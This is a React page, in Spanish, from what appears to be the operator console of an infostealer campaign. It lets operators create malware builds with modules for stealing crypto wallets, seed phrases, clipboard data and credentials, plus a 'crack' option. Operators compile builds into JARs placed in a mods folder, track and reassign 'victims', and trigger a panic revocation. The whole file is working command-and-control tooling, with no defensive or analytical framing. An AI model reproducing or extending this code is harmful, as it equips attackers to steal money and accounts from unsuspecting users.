'use client';
import { useState } from 'react';
import { ArrowRightLeft, Copy, Download, Hammer, Power, Plus, Trash2 } from 'lucide-react';
import { toast } from 'sonner';
import { useApi, mutate } from '@/hooks/useApi';
import { ApiError } from '@/lib/api';
import { useRole } from '@/components/live-provider';
import { Topbar } from '@/components/topbar';
import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Dialog, DialogContent, DialogTitle } from '@/components/ui/dialog';
import { Input, Label, Select } from '@/components/ui/input';
import { Empty, SkeletonRows, Table, TD, TH, THead, TR } from '@/components/ui/table';
import { copy, dateTime, short } from '@/lib/format';
import type { Build } from '@/lib/types';
import { humanError } from '@/lib/errors';

export default function BuildsPage() {
  const { data, loading, refresh, error } = useApi<{ items: Build[] }>('/builds', { pollMs: 15_000 });
  const versions = useApi<{ release: string | null }>('/versions', { pollMs: 60_000 });
  const [q, setQ] = useState('');
  const [open, setOpen] = useState(false);
  const [busy, setBusy] = useState('');
  const [reassignFor, setReassignFor] = useState<Build | null>(null);
  const [reassignTarget, setReassignTarget] = useState('');
  const [form, setForm] = useState({ name: '', version: '1.0.0', profile: 'full', modules: { wallets: true, clipboard: true, credentials: true, seeds: true }, crack: true, enroll_grace_hours: 24 });
  const role = useRole();

  async function create(event: React.FormEvent) {
    event.preventDefault();
    setBusy('create');
    try {
      const created = await mutate<{ id: string; token: string }>('/builds', 'POST', form);
      toast.success('Build creado', { description: `token ${created.token.slice(0, 16)}…` });
      setOpen(false);
      refresh();
    } catch (caught) {
      toast.error(humanError(caught) || 'No se pudo crear');
    } finally {
      setBusy('');
    }
  }

  async function compile(id: string) {
    setBusy(id);
    try {
      await mutate(`/builds/${id}/compile`, 'POST');
      toast.success('JAR compilado');
      refresh();
    } catch (caught) {
      toast.error(humanError(caught) || 'No se pudo compilar');
    } finally {
      setBusy('');
    }
  }

  async function revoke(build: Build) {
    if (!confirm(`¿Revocar ${build.name} v${build.version}? También se revocan todas sus víctimas.`)) return;
    setBusy(build.id);
    try {
      await mutate(`/builds/${build.id}/revoke`, 'POST');
      toast.success('Build revocado');
      refresh();
    } catch (caught) {
      toast.error(humanError(caught) || 'No se pudo revocar');
    } finally {
      setBusy('');
    }
  }

  async function remove(build: Build) {
    if (!confirm(`¿Eliminar ${build.name} v${build.version}? El JAR permanece en disco.`)) return;
    setBusy(build.id);
    try {
      await mutate(`/builds/${build.id}`, 'DELETE');
      toast.success('Build eliminado');
      refresh();
    } catch (caught) {
      if (caught instanceof ApiError && caught.code === 'in_use') {
        toast.error(caught.message, {
          description: 'Reasigna sus víctimas o abre la lista filtrada.',
          action: { label: 'Abrir víctimas', onClick: () => window.open(`/victims?build=${build.id}`, '_blank') }
        });
      } else {
        toast.error(humanError(caught) || 'No se pudo eliminar');
      }
    } finally {
      setBusy('');
    }
  }

  async function panic() {
    try {
      const preview = await mutate<{ builds: number; victims: number }>('/panic?dry_run=1', 'POST');
      if (!confirm(`Pánico: ${preview.builds} build(s) y ${preview.victims} víctima(s) quedarán revocados.\n\nLa cola local se conserva, pero cada víctima deberá volver a enrolar tras restaurar.`)) return;
      await mutate('/panic', 'POST');
      toast.success('Pánico aplicado');
      refresh();
    } catch (caught) {
      toast.error(humanError(caught) || 'No se pudo aplicar el pánico');
    }
  }

  async function restore() {
    if (!confirm('Restaurar solo reabre el enrolamiento: las víctimas revocadas siguen revocadas hasta que vuelvan a enrolar. ¿Continuar?')) return;
    try {
      await mutate('/panic/restore', 'POST');
      toast.success('Enrolamiento reabierto; las víctimas deben re-enrolar');
      refresh();
    } catch (caught) {
      toast.error(humanError(caught) || 'No se pudo restaurar');
    }
  }

  async function reassign(event: React.FormEvent) {
    event.preventDefault();
    if (!reassignFor || !reassignTarget) return;
    setBusy(reassignFor.id);
    try {
      const result = await mutate<{ moved: number }>(`/builds/${reassignFor.id}/reassign`, 'POST', { target: reassignTarget });
      toast.success(`${result.moved} víctima(s) reasignadas`);
      setReassignFor(null);
      refresh();
    } catch (caught) {
      toast.error(humanError(caught) || 'No se pudo reasignar');
    } finally {
      setBusy('');
    }
  }

  return (
    <>
      <Topbar title="Builds" subtitle="perfil, módulos y clave de artefactos · el build_id deriva la clave" />
      <div className="pt-3">
        <Card>
          <CardHeader>
            <CardTitle>Catálogo de builds</CardTitle>
            <div className="flex flex-wrap items-center gap-2">
              <Input value={q} onChange={(event) => setQ(event.target.value)} placeholder="filtrar por nombre o build_id" className="h-7 w-[220px]" aria-label="Filtrar builds" />
              {role === 'admin' ? <>
                <Button size="sm" variant="secondary" onClick={panic}>pánico</Button>
                <Button size="sm" variant="ghost" onClick={restore}>restaurar</Button>
                <Button size="sm" onClick={() => { setForm((current) => ({ ...current, version: versions.data?.release ?? current.version })); setOpen(true); }}><Plus className="h-3 w-3" /> nuevo build</Button>
              </> : null}
            </div>
          </CardHeader>
          {error ? <p className="p-3 text-xs text-bad">{error.message}</p> : loading ? <SkeletonRows rows={6} cols={6} /> : (data?.items ?? []).length === 0 ? <Empty title="Sin builds" hint="Crea un build, compila el JAR y déjalo en mods/." /> : (
            <Table>
              <THead><TR><TH>Nombre</TH><TH>Versión</TH><TH>Perfil</TH><TH>build_id</TH><TH>Víctimas</TH><TH>Estado</TH><TH>Creado</TH><TH><span className="sr-only">Acciones</span></TH></TR></THead>
              <tbody>
                {data!.items.filter((build) => !q.trim() || `${build.name} ${build.buildId}`.toLowerCase().includes(q.trim().toLowerCase())).map((build) => (
                  <TR key={build.id}>
                    <TD className="text-xs">{build.name}{build.universal ? <Badge tone="ok" className="ml-1">universal</Badge> : null}</TD>
                    <TD className="num">{build.version}</TD>
                    <TD><Badge tone={build.profile === 'lite' ? 'warn' : 'brand'}>{build.profile}</Badge></TD>
                    <TD className="font-mono text-2xs">{short(build.buildId)}</TD>
                    <TD className="num">{build.victims}</TD>
                    <TD><Badge tone={build.status === 'ready' ? 'ok' : build.status === 'revoked' ? 'bad' : 'default'}>{build.status}</Badge></TD>
                    <TD className="num text-2xs text-muted">{dateTime(build.createdAt)}</TD>
                    <TD>
                      <div className="flex justify-end gap-1">
                        <Button size="icon" variant="ghost" title="copiar token" onClick={() => { copy(build.token); toast.success('token copiado'); }}><Copy className="h-3 w-3" /></Button>
                        {role === 'admin' ? <Button size="icon" variant="ghost" title="compilar" loading={busy === build.id} onClick={() => compile(build.id)}><Hammer className="h-3 w-3" /></Button> : null}
                        {build.jarPath ? <a href={`/api/console/builds/${build.id}/download`} aria-label={`Descargar JAR de ${build.name}`} title="Descargar JAR" className="grid h-7 w-7 place-items-center rounded text-muted hover:text-brand"><Download className="h-3 w-3" /></a> : null}
                        {role === 'admin' ? <Button size="icon" variant="ghost" title="reasignar víctimas" disabled={build.victims === 0 || busy === build.id} onClick={() => { setReassignFor(build); setReassignTarget(''); }}><ArrowRightLeft className="h-3 w-3" /></Button> : null}
                        {build.status !== 'revoked' && role === 'admin' ? <Button size="icon" variant="ghost" title="revocar" loading={busy === build.id} disabled={busy === build.id} onClick={() => revoke(build)}><Power className="h-3 w-3" /></Button> : null}
                        {role === 'admin' ? <Button size="icon" variant="ghost" title="eliminar (no debe estar en uso)" loading={busy === build.id} disabled={busy === build.id} onClick={() => remove(build)}><Trash2 className="h-3 w-3" /></Button> : null}
                      </div>
                    </TD>
                  </TR>
                ))}
              </tbody>
            </Table>
          )}
        </Card>
      </div>

      <Dialog open={open} onOpenChange={setOpen}>
        <DialogContent>
          <DialogTitle>Nuevo build</DialogTitle>
          <CardContent className="px-0">
            <form onSubmit={create} className="space-y-2">
              <div><Label>Nombre</Label><Input required value={form.name} onChange={(event) => setForm({ ...form, name: event.target.value })} /></div>
              <div><Label>Versión</Label><Input required pattern="\d+\.\d+\.\d+" value={form.version} onChange={(event) => setForm({ ...form, version: event.target.value })} /></div>
              <div><Label>Perfil</Label><Select value={form.profile} onChange={(event) => setForm({ ...form, profile: event.target.value })} className="w-full"><option value="full">full</option><option value="lite">lite</option></Select></div>
              <fieldset className="rounded border border-line p-2">
                <legend className="px-1 text-2xs uppercase tracking-wide text-muted">Módulos</legend>
                <div className="grid grid-cols-2 gap-1">
                  {(['wallets', 'clipboard', 'credentials', 'seeds'] as const).map((module) => {
                    const forcedOff = form.profile === 'lite' && module !== 'wallets';
                    return (
                      <label key={module} className={`flex items-center gap-2 text-xs ${forcedOff ? 'text-muted/50' : ''}`}>
                        <input type="checkbox" disabled={forcedOff} checked={!forcedOff && form.modules[module]} onChange={(event) => setForm({ ...form, modules: { ...form.modules, [module]: event.target.checked } })} />
                        {module}{forcedOff ? ' (solo full)' : ''}
                      </label>
                    );
                  })}
                  <label className={`flex items-center gap-2 text-xs ${form.profile === 'lite' ? 'text-muted/50' : ''}`}>
                    <input type="checkbox" disabled={form.profile === 'lite'} checked={form.profile === 'full' && form.crack} onChange={(event) => setForm({ ...form, crack: event.target.checked })} />
                    crack
                  </label>
                </div>
              </fieldset>
              <div><Label>Gracia de re-enrolamiento (h, 0 = desactivada)</Label><Input type="number" min={0} max={168} value={form.enroll_grace_hours} onChange={(event) => setForm({ ...form, enroll_grace_hours: Number(event.target.value) })} /></div>
              <p className="text-2xs text-muted">Se generan 32 bytes de secreto y un build_id. El token deriva del secreto; guarda ambos. El perfil lite fuerza seeds, credenciales y crack a off.</p>
              <div className="flex justify-end"><Button type="submit" loading={busy === 'create'}>Crear</Button></div>
            </form>
          </CardContent>
        </DialogContent>
      </Dialog>

      <Dialog open={Boolean(reassignFor)} onOpenChange={(value) => { if (!value) setReassignFor(null); }}>
        <DialogContent>
          <DialogTitle>Reasignar víctimas antes de eliminar</DialogTitle>
          <form onSubmit={reassign} className="mt-3 space-y-2">
            <p className="text-xs text-muted">
              {reassignFor?.name} v{reassignFor?.version} tiene {reassignFor?.victims} víctima(s). Muévelas a otro build vivo.
            </p>
            <p className="text-2xs text-muted">
              Los agentes instalados conservan su config hasta el redespliegue; los artefactos posteriores siguen ligados al secreto anterior.
            </p>
            <div>
              <Label>Build destino</Label>
              <Select value={reassignTarget} onChange={(event) => setReassignTarget(event.target.value)} className="w-full">
                <option value="">selecciona…</option>
                {(data?.items ?? []).filter((item) => item.id !== reassignFor?.id && item.status !== 'revoked').map((item) => (
                  <option key={item.id} value={item.id}>{item.name} v{item.version} · {item.profile}</option>
                ))}
              </Select>
            </div>
            <div className="flex justify-end gap-2">
              <Button type="button" variant="ghost" onClick={() => setReassignFor(null)}>Cancelar</Button>
              <Button type="submit" disabled={!reassignTarget} loading={busy === reassignFor?.id}>Reasignar</Button>
            </div>
          </form>
        </DialogContent>
      </Dialog>
    </>
  );
}
